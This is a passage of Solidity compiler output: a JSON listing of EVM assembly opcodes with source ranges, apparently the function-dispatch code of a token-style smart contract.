										},
										{
											"begin": 670,
											"end": 753,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH [tag]",
											"value": "38"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "tag",
											"value": "38"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMPDEST"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MLOAD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "ADD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP3"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SUB"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP3"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MSTORE"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP4"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MLOAD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MSTORE"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "ADD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MLOAD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "ADD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP4"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP4"
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2"
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "ADD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "AND"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "ISZERO"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMPI"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP3"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SUB"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MLOAD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP4"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SUB"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "EXP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SUB"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "NOT"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "AND"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MSTORE"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "ADD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "tag",
											"value": "43"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMPDEST"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP3"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "MLOAD"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "DUP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP2"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SUB"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "RETURN"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "AND"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMPDEST"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "MLOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ISZERO"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "MSTORE"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "ADD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "MLOAD"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "DUP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SUB"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP1"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "RETURN"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMPDEST"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH [tag]",
											"value": "49"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH [tag]",
											"value": "50"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "tag",
											"value": "49"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMPDEST"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "MLOAD"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP3"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP2"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "MSTORE"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "ADD"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP2"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "MLOAD"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "DUP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP2"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SUB"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "RETURN"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "JUMPDEST"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH [tag]",
											"value": "52"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "53"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "53"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "ADD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "AND"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "ADD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP3"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "tag",
											"value": "52"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "JUMPDEST"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "MLOAD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP3"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "MSTORE"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "ADD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "MLOAD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SUB"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "RETURN"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "55"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "AND"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "AND"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMPDEST"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "MLOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ISZERO"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "DUP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "MSTORE"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "ADD"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "MLOAD"
										},
										{
											"begin": 3155,
											"end": 3411,
